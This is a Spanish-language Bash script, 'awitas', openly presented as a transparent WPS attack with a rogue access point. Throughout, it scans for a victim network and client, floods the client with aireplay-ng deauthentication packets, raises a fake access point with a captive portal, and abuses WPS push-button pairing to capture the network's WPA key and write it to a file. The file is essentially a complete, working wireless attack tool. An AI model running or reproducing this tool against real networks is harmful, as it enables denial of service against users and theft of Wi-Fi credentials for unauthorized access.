#!/bin/bash
########################### byTux0
### Este script esta inspirado en el trabajo de Koala633 con su trabajo hostbase. https://github.com/Koala633/hostbase ###
###
####### Quiza te interese configurar las siguientes variabes###############
# Es el directorio donde se guardan las variables y las salidas de los comandos importantes. Muy interesante si se necesita depurar algo
pwd=/tmp/awitas/
# Es el tiempo (en segundos) de espera despues de quitar el modo monitor durante el ataque. Algunos dispositivos se toman su tiempo.
tiempo_espera_monitor=5
# Este es el tiempo (en segundos) de espera al reiniciar NertworManager durante el ataque. Algunos dispositivos tardan en volver a trabajar bien.
tiempo_espera=20
# Estos son los paquetes de desautenticacion que manda aireplay. Ponlos a tu gusto, a fin de cuentas a mi me da lo mismo..
desaut=60
############################################################################3
##################################
CYAN=`echo -e "\033[01;36m"`
VERDE=`echo -e "\e[32m"`
BLANCO=`echo -e "\e[0m"`
AZUL=`echo -e "\e[34m"`
ROJO=`echo -e "\e[31m"`
NORMAL=`echo -e "\033[1;37m"`
ULTRAVERDE=`echo -e "\e[1;32m"`
AMARILLO=`echo -e "\e[1;33m"`
VIOLETA=`echo -e "\e[1;35m"`
#################################
trap "salida" EXIT
### Aqui se guardaran logs, variables y demas monsergas.
mkdir /tmp/awitas &>/dev/null
pwd_local=$(pwd)
mi_pid=$$
function salida () {
echo;echo -e "${AMARILLO}[::]${BLANCO} Limpieza!"
tput cnorm
echo;echo -e "${VERDE}[::]${BLANCO} Quitando modo monitor si esta puesto...!"
monitor quitar
echo -e "${VERDE}[::]${BLANCO} Reiniciando NetworkManager..."
service NetworkManager restart
echo -e "${VERDE}[::]${BLANCO} Matando berate_ap si esta vivo..."
kill  $berate_pid &>/dev/null
sleep 0.5
echo -e "${VERDE}[::]${BLANCO} Matando dnsmasq si esta vivo..."
kill -9 $dnsmasq_pid &>/dev/null
sleep 0.5
echo -e "${VERDE}[::]${BLANCO} Matando nodogsplash si esta vivo..."
kill -9 $nodogsplash_pid &>/dev/null
echo -e "${VERDE}[::]${BLANCO} Eliminando archivos que ya no sirven para nada..."
rm ${pwd}airodump_* 2>/dev/null
echo -e "${VERDE}[::]${BLANCO} Todo limpio. Hasta la proxima!."; echo
echo -e "${ROJO}[!!]${BLANCO} Te recomiendo que si vas a volver a intentar el ataque, reinicies el equipo antes. La limpieza no siempre funciona."
}
function abierto () {
rm ${pwd}dnsmasq &>/dev/null
rm /tmp/hostapd.psk &>/dev/null
touch /tmp/hostapd.psk &>/dev/null
cp resolv.conf ${pwd}resolv.conf &>/dev/null
dnsmasq -C dnsmasq.conf -q --log-facility=${pwd}dnsmasq -r ${pwd}resolv.conf &
dnsmasq_pid=$!
bash berate_mod --vanilla --no-dnsmasq $iface_ap $iface_net "${nombre_ap}" &>${pwd}berate &
berate_pid=$!
sleep 10
grep -v WebRoot nds.conf | grep -v GatewayInterface  > nodogsplash.conf
echo "WebRoot $ruta" >> nodogsplash.conf
iface_nodog=`cat ${pwd}berate | grep ENABLE | cut -d ':' -f1 | uniq`
cat ${pwd}berate | grep ENABLE | cut -d ':' -f1 | uniq > ${pwd}iface_nodog
echo "GatewayInterface $iface_nodog" >> nodogsplash.conf
nodogsplash -c nodogsplash.conf >${pwd}nodogsplash &
nodogsplash_pid=$!
dos &
while :
do
sleep 30
grep -i $mac_estacion ${pwd}berate >/dev/null
if [ $? = 0 ];then
        kill $pid_wps_pbc &>/dev/null
        touch ${pwd}parar
	kill $pid_aireplay &>/dev/null
        echo -e "${CYAN}[AP]${VERDE}    Usuario conectado en nuestro punto de acceso! Parando DoS...${BLANCO}"
        break
else
        echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
fi
done
pbc_bucle
}
function crear_ap () {
if [ $tipo = 2 ];then
	abierto
fi
rm ${pwd}dnsmasq &>/dev/null
rm /tmp/hostapd.psk &>/dev/null
touch /tmp/hostapd.psk &>/dev/null
cp resolv.conf ${pwd}resolv.conf &>/dev/null
dnsmasq -C dnsmasq.conf -q --log-facility=${pwd}dnsmasq -r ${pwd}resolv.conf &
dnsmasq_pid=$!
bash berate_mod --vanilla --no-dnsmasq $iface_ap $iface_net "${nombre_ap}" 00000000 &>${pwd}berate &
berate_pid=$!
sleep 10
grep -v WebRoot nds.conf | grep -v GatewayInterface  > nodogsplash.conf
echo "WebRoot $ruta" >> nodogsplash.conf
iface_nodog=`cat ${pwd}berate | grep ENABLE | cut -d ':' -f1 | uniq`
cat ${pwd}berate | grep ENABLE | cut -d ':' -f1 | uniq > ${pwd}iface_nodog
echo "GatewayInterface $iface_nodog" >> nodogsplash.conf
nodogsplash -c nodogsplash.conf >${pwd}nodogsplash &
nodogsplash_pid=$!
dos &
while :
do
sleep 30
grep CONNECTED ${pwd}berate >/dev/null
if [ $? = 0 ];then
	kill $pid_wps_pbc &>/dev/null
	touch ${pwd}parar
	echo -e "${CYAN}[AP]${VERDE} 	Usuario conectado en nuestro punto de acceso! Parando DoS...${BLANCO}"
	break
else
	echo -e "${CYAN}[AP]${BLANCO}	Nadie conectado todavia en nuestro punto de acceso. Seguimos..."
fi
kill $pid_wps_pbc &>/dev/null
hostapd_cli -p /tmp/hostapd_ctrl wps_pbc >${pwd}hostapd_cli_wps_pbc &
pid_wps_pbc=$!
done
pbc_bucle
}
function validar_numero () {
if [[ $1 -eq "0" ]];then
	echo -ne "${ROJO}[!!]${BLANCO} $1 no es una opcion correcta. pulsa enter para repetir. "
        read
        $2
fi
numero='^[0-9]+$'
while :
do
        if [[ $1 =~ $numero ]];then
                break
        else
                echo -ne "${ROJO}[!!]${BLANCO} $1 no es una opcion correcta. pulsa enter para repetir. "
		read
		$2
                break
        fi
done
}
function comprobar_wpa () {
while :
do
sleep 15
ps fax | grep -i "wpa_supplicant -c ${pwd}pbc.conf" | grep -v grep &>/dev/null
if [ $? -ne 0 ];then
	escuchar_wps
fi
if ( grep -q "network=" ${pwd}pbc.conf ) ;
              then
                cat ${pwd}pbc.conf | grep "${nombre_ap}" &>/dev/null
                if [ $? -eq 0 ]; then
                        escuchar_wps
                fi
                cp ${pwd}pbc.conf  ${red}_WPA.txt
                echo -e "${VIOLETA}[**]${VERDE}	La tenemos!! hemos conseguido la llave!${BLANCO}"
                wpa=`cat ${pwd}pbc.conf | grep psk= | cut -d '"' -f 2`
                ssid=`cat ${pwd}pbc.conf | grep ssid= | cut -d '"' -f 2`
                echo;echo -e "  ${AMARILLO} red ${VERDE} $ssid ${AMARILLO} WPA ${VERDE} $wpa ";echo
                echo -e "${AMARILLO}[::]${BLANCO} Se ha creado un archivo con la WPA en el directorio de trabajo."
                echo -e "${AMARILLO}[::]${BLANCO} Un placer y hasta la proxima!!!...ByTux0..."
		break
fi
done
kill $mi_pid &>/dev/null && kill $pid_comprobar_wpa &>/dev/null && exit 
kill $$ &>/dev/null
exit && exit
}
function escuchar_wps () {
rm  ${pwd}pbc.conf &>/dev/null
rm /var/run/wpa_supplicant/${iface_dos} 2>/dev/null
ip link set "$iface_dos" down &>/dev/null
iwconfig "$iface_dos" mode managed &>/dev/null
ip link set "$iface_dos" up &>/dev/null
echo "ctrl_interface=/var/run/wpa_supplicant 
ctrl_interface_group=root
update_config=1" >> ${pwd}pbc.conf
comprobar_wpa &
pid_comprobar_wpa=$!
wpa_supplicant -c ${pwd}pbc.conf -i "$iface_dos" -B &>${pwd}wpa_supplicant
if [ $? != 0 ]; then
        sleep 3
        escuchar_wps
fi
crono
}
function crono () {
krono=30
    while [ $krono -gt 0 ]; 
      do
        krono=$((krono - 1))
        sleep 1
    done
sleep 2
echo -e "${VIOLETA}[WPS]${BLANCO}	Reiniciamos escucha WPS"
kill $pid_wpacli &>/dev/null
sleep 3
wpa_cli -i "$iface_dos" wps_pbc any &>${pwd}wpa_cli &
pid_wpacli=$!
crono
}
function pbc_bucle () {
echo -e "${VIOLETA}[WPS]${BLANCO}	Comenzamos a escuchar WPS"
escuchar_wps
}
function comprobar () {
clear
banner
if [ $tipo -eq 1 ];then
	seguridad=protegido
elif [ $tipo -eq 2 ];then
	seguridad=abierto
fi
echo;echo -e "${AMARILLO} Vamos a comprobar todos los datos antes de empezar el ataque${BLANCO}."
red=`cat ${pwd}elegida | cut -d ',' -f14`
echo;echo -e "${AMARILLO}[::]${BLANCO} Red a atacar: ${VERDE} $red"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para el ataque DoS: ${VERDE} $iface_dos"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para crear el punto de acceso: ${VERDE} $iface_ap"
echo -e "${AMARILLO}[::]${BLANCO} Cliente a atacar: ${VERDE} $mac_estacion"
echo -e "${AMARILLO}[::]${BLANCO} Nombre de nuestra red ${VERDE} $nombre_ap"
echo -e "${AMARILLO}[::]${BLANCO} Tipo de red ${VERDE} $seguridad"
echo -e "${AMARILLO}[::]${BLANCO} Dispositivo para dar internet: ${VERDE} $iface_net"
echo -e "${AMARILLO}[::]${BLANCO} Ruta de nuestro servidor http: ${VERDE} $ruta"
echo;echo -e "${AMARILLO}[::]${BLANCO} Opciones: "
echo;echo -e "		${AMARILLO}1)${BLANCO}	Que comiencen los juegos!! "
echo -e "		${AMARILLO}2)${BLANCO}	Quiero volver a configurarlo todo. "
echo -e "		${AMARILLO}3)${BLANCO}	Quiero volver a configurar los datos del punto de acceso. "
echo -e "		${AMARILLO}4)${BLANCO}	Quiero volver a elegir red de las que ya hemos escaneado. "
echo -e "		${AMARILLO}5)${BLANCO}	Quiero volver a escanear. "
echo;echo -ne "${AMARILLO}[??]${BLANCO} Opcion: "
read opcion
if [ $opcion -eq 1  ];then
	crear_ap
elif [ $opcion -eq 2 ];then
	empezar
elif [ $opcion -eq 3 ];then
        config_ap
elif [ $opcion -eq 4 ];then
	parseo        
elif [ $opcion -eq 5 ];then
        airodump
else
	echo -ne "${ROJO}[::]${BLANCO} $opcion es una opcion incorrecta. Pulsa enter para intentarlo de nuevo."
	read
	comprobar
fi
}
function dos () {
clear
banner
rm ${pwd}parar &>/dev/null
echo;echo -e "${AMARILLO}	COMIENZA EL ATAQUE! Paciencia, ve a tomarte un cafe que esto va a llevar un rato.${BLANCO}";echo
while :
do
ls ${pwd}parar &>/dev/null
if [ $? = 0 ];then
	break
fi
monitor quitar
sleep $tiempo_espera_monitor
service NetworkManager restart >${pwd}network
sleep $tiempo_espera
nmcli d wifi list >${pwd}nmcli
sleep 2
cat ${pwd}nmcli | grep $macap  | awk -F ' ' '{print $4}' | head -n 1 >/${pwd}canal_nuevo
canal_nuevo=`cat ${pwd}canal_nuevo`
if [ $canal -eq $canal_nuevo ];then
	canal=$canal_nuevo
	monitor poner $canal >/dev/null
	echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente sigue en el canal${CYAN} ${canal}${BLANCO}. Seguimos el ataque..."
else
	echo -e "${AMARILLO}[DoS]${BLANCO}	El cliente se ha cambiado al canal${CYAN} ${canal}${BLANCO}. Cambiamos de canal..."
	canal=$canal_nuevo
	monitor poner $canal >/dev/null
	echo -e "${AMARILLO}[::]${BLANCO} reiniciando DoS..."
fi
aireplay-ng -0 $desaut -a $macap -c $mac_estacion $iface_mon --ignore-negative-one &>>${pwd}aireplay
pid_aireplay=$!
done
echo -e "${AMARILLO}[DoS]${BLANCO}	Ataque DoS parado por completo."
}
function config_ap () {
clear
banner
echo;echo -e "${AMARILLO} Ahora toca configurar nuestro punto de acceso${BLANCO}."
echo -e "${AMARILLO} Levantaremos un punto de acceso protegido (solo para clientes con windows) o abierto? ${BLANCO}";echo
echo -e "		${AMARILLO}1)${BLANCO} Protegido"
echo -e "		${AMARILLO}2)${BLANCO} Abierto"
echo;echo -ne "${AMARILLO}[??]${BLANCO} opcion: "
read tipo
validar_numero $tipo config_ap
if [ $tipo -ne 1 ] && [ $tipo -ne 2 ];then
	echo -ne "${ROJO}[!!]${BLANCO} $tipo no es una respuesta valida. Pulsa enter para intentarlo otra vez"
	read
	config_ap
fi
echo;echo -ne "${AMARILLO}[::]${BLANCO} Nombre el punto de acceso que vamos a crear. (Necesario): "
read nombre_ap
echo "${nombre_ap}" >${pwd}nombre_ap &>/dev/null
echo -ne "${AMARILLO}[::]${BLANCO} Iface con la que daremos internet su fuera necesario. Si no tienes ni idea de que es esto, da enter y ya: "
read iface_net
ifconfig | grep mtu | grep -v iface_ap | grep -v iface_dos | cut -d ':' -f 1 > /tmp/ifaces
if [ -z $iface_net ];then
	iface_net=eth0
else
	grep $iface_net /tmp/ifaces &>/dev/null
	if [ $? -ne 0 ];then
		echo -ne "${ROJO}[!!]${BLANCO} $iface_net no es una ifaced valida. Pulsa enter para intentarlo otra vez"
		read
		config_ap
	fi
fi
echo -ne "${AMARILLO}[::]${BLANCO} Ruta completa a nuestra carpeta http. ej. /root/miwebsite/ Por defecto se usara http/ (enter para usar esta): "
read ruta
if [ -z $ruta ];then
        ruta=`pwd`/http/
fi
ls $ruta &>/dev/null
if [ $? -ne 0 ];then
        echo -ne "${ROJO}[!!]${BLANCO} $ruta no es una ruta valida. Pulsa enter para intentarlo otra vez"        
        read
        config_ap
fi
comprobar
}
function clientes () {
clear
banner
sed -n ${1}p ${pwd}airodump >${pwd}elegida
macap=`cat ${pwd}elegida | cut -d ',' -f1`
maoui=`echo $macap | awk -F ":" '{print $1 $2 $3}'`
canal=`cat ${pwd}elegida | cut -d ',' -f4`
rm ${pwd}macap 2>/dev/null
rm ${pwd}cliente* 2>/dev/null
echo "$macap" >${pwd}macap
marca=`grep $maoui /var/lib/ieee-data/oui.txt | cut -f3,4,5,6,7,8`
red=`cat ${pwd}elegida | cut -d ',' -f14`
echo;echo -e "${AMARILLO} TU ELECCION:"
echo;echo -e "${AMARILLO} Punto de acceso ${BLANCO}$red  ${AMARILLO}MAC ${BLANCO}$MAC $macap	${AMARILLO}Marca del dispositivo${BLANCO} $marca"
echo;echo -e "${AMARILLO} CLIENTES CONECTADOS:${BLANCO}";echo
cuenta=1
for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
do
	echo $i >${pwd}cliente${cuenta}
	maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
	marca_cliente=`grep $maoui_cliente /var/lib/ieee-data/oui.txt | cut -f3,4,5,6,7,8`
	echo -e "	${CYAN}MAC ${BLANCO} $i ${CYAN}Marca del dispositivo ${BLANCO} $marca_cliente"
	cuenta=$((cuenta+1))
done
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige una de las siguientes opciones:" ;echo
echo -e "		${AMARILLO}1)${BLANCO} Quiero elegir un cliente y continuar el ataque."
echo -e "		${AMARILLO}2)${BLANCO} Quiero elegir otra red de las que hemos escaneado ya."
echo -e "		${AMARILLO}3)${BLANCO} Quiero volver a escanear."
echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
read respuesta
if [ $respuesta = 1 ];then
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ok!. Escoge un numero de cliente ";echo
cuenta=1
for i in `grep $macap ${pwd}airodump | grep -v WPA | cut -d ',' -f1`
do
        maoui_cliente=`echo $i | awk -F ":" '{print $1 $2 $3}'`
        marca_cliente=`grep $maoui_cliente /var/lib/ieee-data/oui.txt | cut -f3,4,5,6,7,8`
        echo -e "${AMARILLO} ${cuenta}) ${CYAN}MAC ${BLANCO} $i ${CYAN}Marca del dispositivo ${BLANCO} $marca_cliente"
        cuenta=$((cuenta+1))
done
	echo;echo -ne "${AMARILLO}[::]${BLANCO} Opcion: "
	read opcion
	validar_numero $opcion parseo
	cuenta=$((cuenta-1))
	if [ $opcion -le $cuenta ]; then
		mac_estacion=`cat ${pwd}cliente${opcion}`
        	config_ap
	else
        	echo -ne "${ROJO}[::]${BLANCO} $opcion es una opcion incorrecta. Pulsa enter para elegir red de nuevo."
        	read
        	parseo
        fi
elif [ $respuesta = 2 ];then
	parseo
elif [ $respuesta = 3 ];then
	airodump
else
	echo -e "${ROJO}[!!]${BLANCO} $espuesta no es una opcion correcta. Pulsa enter para volver a elegir red.${BLANCO}"
	read
	parseo
	exit
fi
}
function banner () {
echo -e "${CYAN}                 _            "
echo -e "   __ ___      _(_) |_ __ _ ___ "
echo -e "  / _\` \\ \\ /\\ / / | __/ _\` / __|"
echo -e " | (_| |\\ V  V /| | || (_| \\__ \\"
echo -e "  \\__,_| \\_/\_/ |_|\\__\\__,_|___/ byTux0"
echo -e "  ${VIOLETA}Ataque WPS transparente con rogue AP${BLANCO}   "
}
function parseo () {
clear
banner
cuenta=1
sed '/^[[:space:]]*$/d' ${pwd}airodump_csv-01.csv | tail -n +2  > ${pwd}airodump
echo;echo -e "${AMARILLO}[::]${BLANCO} Redes encontradas:";echo
while IFS= read -r line
do
        echo $line | grep Station >/dev/null
        if [ $? = 0 ];then
                break
        fi
	mac=`echo $line | cut -d ',' -f1`
        grep $mac ${pwd}airodump | grep -v WPA >/dev/null 
        if [ $? = 0 ];then
                clients="${VERDE}si${BLANCO}"
        else
                clients="${ROJO}no${BLANCO}"
        fi
	echo " ${AMARILLO}${cuenta})	${CYAN}BSSID${BLANCO}	`echo $line |  cut -d ',' -f1`	${CYAN}Canal${BLANCO}	`echo $line |  cut -d ',' -f4`	${CYAN}clientes${BLANCO} $clients	${CYAN}Nombre Ap${BLANCO}	`echo $line | cut -d ',' -f14`"
        cuenta=$((cuenta+1))
done < ${pwd}airodump
echo;echo -ne "${AMARILLO}[??]${BLANCO} Elige una de ellas para estudiarla o no escribas nada para volver a escanear. Opcion: "
read red
if [ -v $red ];then
	airodump
else
	validar_numero $red parseo
	cuenta=$((cuenta-1))
	if [ $red -le $cuenta ]; then
		clientes $red 
        else
                echo -ne "${ROJO}[::]${BLANCO} $red es una opcion incorrecta. Pulsa enter para intentarlo de nuevo."
                read
                parseo
        fi
fi
}
function airodump () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera escanear para buscar una victima."
echo -e "${AMARILLO}[::]${BLANCO} Vamos a iniciar el escaneo. Ten en cuenta que necesitamos al menos un cliente con windows para el punto de acceso protegido."
echo -e "${AMARILLO}[::]${BLANCO} Quiza tengas que reducir el tama;o de la fuente de tu consola para ver bien el escaneo."
echo -e "${AMARILLO}[::]${BLANCO} Cuando creas que ya es suficiente, cierra aierodump con ctrl+c y el script seguira su marcha."
echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para iniciar el escaneo"
read
rm ${pwd}airodump* 2>/dev/null
airodump-ng  --wps --output-format csv --manufacturer $iface_mon -w ${pwd}airodump_csv
parseo
}
function scan () {
echo -e "${AMARILLO}[::]${BLANCO} Poniendo $iface_dos en modo monitor..."
monitor poner
if [ $? = 0 ];then
	echo -e "${VERDE}[::]${BLANCO} Hecho!"
	sleep 1
else
	echo -e "${ROJO}[!!]${BLANCO} Algo salio mal. Saliendo..."
fi
airodump
}
function monitor () {
if [ $1 = "poner" ];then
        airmon-ng check kill >/dev/null
        ifconfig $iface_dos down
        if [ -z $2 ];then
                iwconfig $iface_dos mode monitor
        else
                iwconfig $iface_dos mode monitor channel $2
        fi
        ifconfig $iface_dos up
        iface_mon=`iwconfig 2>/dev/null | grep Monitor | awk -F ' ' '{print $1}'`
        iwconfig 2>/dev/null | grep Monitor | cut -f1  > ${pwd}iface_mon
elif [ $1 = "quitar" ];then
        for i in `iwconfig 2>/dev/null | grep Monitor | awk -F ' ' '{print $1}'`
        do
                ifconfig $i down 2>/dev/null
                iwconfig $i mode managed 2>/dev/null
                ifconfig $i up 2>/dev/null
        done
fi
}
function empezar () {
clear
banner
echo;echo -e "${CYAN} En la cabecera del sript puedes configurar algunas cosas. Quiza te venga bien."
echo;echo -e "${AMARILLO}[::]${BLANCO} Bienvenido a awitas."
echo -e "${AMARILLO}[::]${BLANCO} Lo pimero que debemos hacer es elegir un dispositivo para crear nuestro punto de acceso."
echo -e "${AMARILLO}[::]${BLANCO} Por favor, ten en cuenta que el dispositivo tiene que soportar la opcion de crear puto de acceso."
echo -ne "${AMARILLO}[::]${BLANCO} Pulsa enter para elegir dispositivo"
read
echo;echo -e "${AMARILLO}[::]${BLANCO} Estos son tus dispositivos:";echo
airmon-ng | cut  -f1 --complement
airmon-ng | cut  -f1 --complement | grep -v Interface | sed '/^ *$/d' > ${pwd}airmon 2>/dev/null
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para crear nuestro punto de acceso.";echo
cuenta=1
for i in `cat ${pwd}airmon | cut -f1`
	do
	echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
	cuenta=$((cuenta+1))
done
echo;echo -e "${AMARILLO}[::]${BLANCO} Si estas en raspberry 3b o superior, te sugiero que uses la integrada."
echo -ne "${AMARILLO}[??]${BLANCO} Debes estar seguro que soporta el modo AP. Opcion: "
read opcion
validar_numero $opcion empezar
cuenta=$((cuenta-1))
if [ $opcion -le $cuenta ]; then
	cuenta=$((cuenta+1))
	sed -n ${opcion}p ${pwd}airmon | cut -f 1 >${pwd}iface_ap
	iface_ap=`cat ${pwd}iface_ap`
	echo -e "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_ap ${BLANCO}para crear nuestro punto de acceso. Pulsa enter para continuar."
	read
else
	echo -ne "${ROJO}[::]${BLANCO} $opcion es una opcion incorrecta. Pulsa enter para intentarlo de nuevo."
	read
	empezar
fi
elegir_monitor
}
function elegir_monitor () {
clear
banner
echo;echo -e "${AMARILLO}[::]${BLANCO} Ahora lo que haremos sera elegir un dispositivo para el ataque DoS."
echo -e "${AMARILLO}[::]${BLANCO} Debes estar seguro de que el dispositivo tiene la capacidad de inyectar paquetes."
echo -e -e "${AMARILLO}[::]${BLANCO} Pulsa enter para continuar."
read
echo -e  "${AMARILLO}[::]${BLANCO} Estos son los dispositivos que quedan disponibles:"
airmon-ng | cut  -f1 --complement | grep -v $iface_ap
echo;echo -e "${AMARILLO}[::]${BLANCO} Elige un dispositivo para hacer el ataque de desautenticacion (DoS)";echo
cuenta=1
for i in `cat ${pwd}airmon | grep -v $iface_ap | cut -f1`
        do
        echo -e " ${AMARILLO}${cuenta})${BLANCO}  $i "
        cuenta=$((cuenta+1))
done
echo;echo -ne "${AMARILLO}[::]${BLANCO} Debes estar seguro de que puede inyectar paquetes. Opcion: "
read opcion
validar_numero $opcion elegir_monitor 
cuenta=$((cuenta-1))
if [ $opcion -le $cuenta ]; then
	cuenta=$((cuenta+1))
	cat ${pwd}airmon | grep -v $iface_ap| sed  -n ${opcion}p | cut -f 1 >${pwd}iface_dos
	iface_dos=`cat ${pwd}iface_dos`
	echo -ne "${AMARILLO}[::]${BLANCO} Ok!. Usaremos ${VERDE}$iface_dos${BLANCO} para crear nuestro ataque DoS. Pulsa enter para continuar"
	read
	scan
else
        echo -ne "${ROJO}[::]${BLANCO} $opcion es una opcion incorrecta. Pulsa enter para emezar de nuevo."
        read
        elegir_monitor
fi
}
empezar

